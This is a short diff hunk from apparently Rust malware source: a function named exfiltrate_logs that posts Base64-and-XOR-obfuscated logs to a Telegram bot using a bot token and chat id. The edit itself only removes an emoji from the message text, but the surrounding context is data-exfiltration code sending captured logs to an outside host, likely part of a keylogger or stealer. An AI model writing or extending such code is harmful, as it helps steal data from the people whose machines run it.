@@ -108,7 +108,7 @@ fn exfiltrate_logs(lock: Arc<Mutex<()>>, bot_token: &str, chat_id: &str) -> Resu
     }
 
     // Send encrypted
-    let encrypted_message = format!("🔒 Encrypted (Base64+XOR):\n{}", encrypted_base64);
+    let encrypted_message = format!(" Encrypted (Base64+XOR):\n{}", encrypted_base64);
     let res_enc = client
         .post(&telegram_url)
         .form(&[("chat_id", chat_id), ("text", &encrypted_message)])
